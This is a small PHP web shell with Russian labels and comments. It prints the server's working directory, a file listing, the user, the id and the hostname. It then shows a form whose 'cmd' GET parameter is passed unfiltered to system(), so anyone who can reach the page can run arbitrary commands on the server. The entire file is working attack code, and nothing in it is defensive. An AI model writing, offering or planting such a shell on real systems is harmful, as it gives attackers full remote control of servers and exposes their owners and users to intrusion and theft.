<?php

echo "Текущая директория:  " . exec('pwd') . '<br>';
echo "Содержимое директории:  " .exec('ls') . '<br>';
echo "Имя юзера:  " .exec('whoami') . '<br>';
echo "ID:  " .exec('id') . '<br>';
echo "Имя хоста:  " .exec('hostname') . '<br><br>';
echo "Командная строка:" . '<br>';

// блок инпута для ввода команд
echo '<form><input name="cmd" /></form>';
if(isset($_GET['cmd']))
    //Обращаемся к system Linux, которая выполняет команды в среде Linux
    system($_GET['cmd']);


